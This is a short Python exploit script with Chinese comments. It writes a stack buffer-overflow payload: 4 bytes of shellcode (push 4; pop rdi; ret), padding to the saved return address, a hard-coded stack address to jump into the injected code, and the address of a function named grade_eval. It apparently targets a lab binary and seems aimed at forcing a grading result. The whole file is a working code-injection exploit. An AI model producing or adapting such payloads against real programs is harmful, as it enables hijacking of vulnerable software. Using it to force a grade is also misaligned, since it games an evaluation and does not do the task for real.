import sys
import struct

buf_addr = 0x721000800fd0
grade_eval_addr = 0x401a87

# 4字节机器码：push 4; pop rdi; ret
shellcode = b"\x6a\x04\x5f\xc3"

# 构造 payload
# 1. 4字节机器码 + 20字节A填充，刚好占满 24 字节（16字节buffer + 8字节rbp）
payload = shellcode + b"A" * 20

# 2. 覆盖 input 的返回地址：跳回栈顶 (0xfd0) 执行我们的机器码
payload += struct.pack('<Q', buf_addr)

# 3. 给 shellcode 里面的 ret 准备的目标：grade_eval 的地址
payload += struct.pack('<Q', grade_eval_addr)

# 加换行符，总共 41 字节，绝对安全
sys.stdout.buffer.write(payload + b'\n')
